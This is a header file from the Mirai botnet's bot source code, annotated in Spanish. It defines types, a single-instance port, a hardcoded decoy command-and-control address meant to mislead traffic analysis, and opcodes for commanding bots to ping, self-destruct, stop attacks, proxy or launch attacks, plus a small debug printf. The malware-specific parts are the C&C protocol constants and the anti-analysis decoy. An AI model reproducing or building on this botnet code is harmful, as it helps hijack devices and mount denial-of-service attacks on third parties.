/***************************************************************************
 * Archivo: includes.h
 * 
 * Descripción: Definiciones y tipos comunes para el bot Mirai
 * Este archivo define:
 * - Tipos básicos y alias
 * - Constantes del sistema
 * - Macros de utilidad
 * - Funciones de depuración
 * - Definiciones de red
 * 
 * Notas de implementación:
 * - Compatible con C99 y GNU/Linux
 * - Optimizado para arquitecturas de 32/64 bits
 * - Soporte para depuración condicional
 ***************************************************************************/

/* Prevenir inclusión múltiple */
#pragma once

/* Cabeceras del sistema */
#include <unistd.h>     /* Funciones POSIX básicas */
#include <stdint.h>     /* Tipos enteros con tamaño fijo */
#include <stdarg.h>     /* Soporte para argumentos variables */

/* 
 * Descriptores de archivo estándar
 * Definidos para mayor claridad y portabilidad
 */
#define STDIN   0       /* Entrada estándar */
#define STDOUT  1       /* Salida estándar */
#define STDERR  2       /* Salida de error estándar */

/* 
 * Tipo booleano y sus valores
 * Usando char para minimizar uso de memoria
 */
#define FALSE   0       /* Valor falso */
#define TRUE    1       /* Valor verdadero */
typedef char BOOL;      /* Tipo booleano de 8 bits */

/* 
 * Tipos personalizados para red
 * Proporciona mejor semántica y portabilidad
 */
typedef uint32_t ipv4_t;    /* Dirección IPv4 (32 bits) */
typedef uint16_t port_t;    /* Puerto TCP/UDP (16 bits) */

/**
 * Macro para crear direcciones IPv4
 * Convierte 4 octetos a una dirección IP en network byte order
 * 
 * @param o1  Primer octeto (más significativo)
 * @param o2  Segundo octeto
 * @param o3  Tercer octeto
 * @param o4  Cuarto octeto (menos significativo)
 * @return    Dirección IPv4 en formato uint32_t
 */
#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

/* Puerto para asegurar instancia única del bot */
#define SINGLE_INSTANCE_PORT 48101

/* 
 * Configuración del servidor C&C señuelo
 * Usado para engañar análisis de tráfico
 */
#define FAKE_CNC_ADDR   INET_ADDR(65,222,202,53)  /* IP del CNC señuelo */
#define FAKE_CNC_PORT   80                         /* Puerto señuelo (HTTP) */

/* 
 * Códigos de operación para comunicación con C&C
 * Cada código identifica un tipo específico de comando
 */
#define CNC_OP_PING         0x00    /* Verificar conectividad con el bot */
#define CNC_OP_KILLSELF     0x10    /* Ordenar al bot que se autodestruya */
#define CNC_OP_KILLATTKS    0x20    /* Detener todos los ataques activos */
#define CNC_OP_PROXY        0x30    /* Iniciar modo proxy */
#define CNC_OP_ATTACK       0x40    /* Iniciar un nuevo ataque */

/* Dirección IP local del bot (asignada dinámicamente) */
ipv4_t LOCAL_ADDR;

/* Funciones de depuración (solo disponibles en modo DEBUG) */
#ifdef DEBUG

/* Puntero para salida en buffer */
static char *outptr;

/**
 * Escribe un carácter en la salida
 * Soporta escritura en buffer o en stdout
 * 
 * @param c  Carácter a escribir
 */
static void xputc(char c)
{
    if (outptr) {
        *outptr++ = (unsigned char)c;  /* Escribir en buffer */
        return;
    } else {
        write(0, &c, 1);              /* Escribir en stdout */
    }
}

/**
 * Escribe una cadena en la salida
 * 
 * @param str  Cadena a escribir (null-terminated)
 */
static void xputs(const char *str)
{
    while (*str)                      /* Procesar hasta fin de cadena */
        xputc(*str++);                /* Escribir carácter a carácter */
}

/**
 * Implementación minimalista de vprintf
 * Soporta los siguientes formatos:
 * %s - String
 * %c - Carácter
 * %b - Binario
 * %o - Octal
 * %d - Decimal con signo
 * %u - Decimal sin signo
 * %x,%X - Hexadecimal
 * 
 * Modificadores soportados:
 * 0 - Zero padding
 * - - Alineación izquierda
 * l,L - Long int
 * Ancho mínimo
 * 
 * @param fmt  String de formato
 * @param arp  Lista de argumentos variables
 */
static void xvprintf(const char *fmt, va_list arp)
{
    unsigned int r, i, j, w, f;       /* Variables de control */
    unsigned long v;                  /* Valor a convertir */
    char s[16], c, d, *p;            /* Buffers y variables temporales */

    /* Procesar string de formato */
    for (;;) {
        c = *fmt++;                   /* Obtener siguiente carácter */
        if (!c) break;                /* Fin del formato */

        if (c != '%') {               /* Carácter normal */
            xputc(c); continue;
        }

        /* Procesar especificador de formato */
        f = 0;                        /* Flags */
        c = *fmt++;                   /* Siguiente carácter después de % */

        if (c == '0') {               /* Flag: padding con ceros */
            f = 1; c = *fmt++;
        } else if (c == '-') {        /* Flag: alineación izquierda */
            f = 2; c = *fmt++;
        }

        /* Procesar ancho mínimo */
        for (w = 0; c >= '0' && c <= '9'; c = *fmt++)
            w = w * 10 + c - '0';

        /* Procesar modificador de tamaño */
        if (c == 'l' || c == 'L') {   /* Long int */
            f |= 4; c = *fmt++;
        }

        if (!c) break;                /* Fin inesperado */
        
        /* Convertir a mayúscula para switch */
        d = (c >= 'a') ? c - 0x20 : c;

        /* Procesar tipo de formato */
        switch (d) {
        case 'S':                     /* String */
            p = va_arg(arp, char*);
            for (j = 0; p[j]; j++);   /* Calcular longitud */
            /* Padding izquierdo */
            while (!(f & 2) && j++ < w) xputc(' ');
            xputs(p);                 /* Escribir string */
            /* Padding derecho */
            while (j++ < w) xputc(' ');
            continue;

        case 'C':                     /* Carácter */
            xputc((char)va_arg(arp, int));
            continue;

        case 'B':                     /* Binario */
            r = 2; break;
        case 'O':                     /* Octal */
            r = 8; break;
        case 'D':                     /* Decimal con signo */
        case 'U':                     /* Decimal sin signo */
            r = 10; break;
        case 'X':                     /* Hexadecimal */
            r = 16; break;

        default:                      /* Tipo desconocido */
            xputc(c); continue;
        }

        /* Convertir número según base */
        v = (f & 4) ?                 /* Long o normal */
            va_arg(arp, long) : 
            ((d == 'D') ? 
                (long)va_arg(arp, int) : 
                (long)va_arg(arp, unsigned int));

        /* Manejar signo negativo */
        if (d == 'D' && (v & 0x80000000)) {
            v = 0 - v;
            f |= 8;                   /* Flag de negativo */
        }

        /* Convertir a string */
        i = 0;
        do {
            d = (char)(v % r);        /* Siguiente dígito */
            v /= r;                   /* Dividir por base */
            /* Convertir a carácter */
            if (d > 9) 
                d += (c == 'x') ? 0x27 : 0x07;
            s[i++] = d + '0';
        } while (v && i < sizeof(s));

        if (f & 8) s[i++] = '-';      /* Añadir signo negativo */

        /* Aplicar padding */
        j = i;
        d = (f & 1) ? '0' : ' ';      /* Carácter de padding */
        while (!(f & 2) && j++ < w) xputc(d);
        do xputc(s[--i]); while(i);   /* Escribir dígitos */
        while (j++ < w) xputc(' ');   /* Padding derecho */
    }
}

/**
 * Implementación minimalista de printf
 * Wrapper sobre xvprintf para argumentos variables
 * 
 * @param fmt   String de formato
 * @param ...   Argumentos variables
 */
static void xprintf(const char *fmt, ...)
{
    va_list arp;
    va_start(arp, fmt);              /* Inicializar lista de argumentos */
    xvprintf(fmt, arp);              /* Procesar formato */
    va_end(arp);                     /* Limpiar */
}

/* Redefinir printf para usar nuestra implementación */
#define printf xprintf

#endif

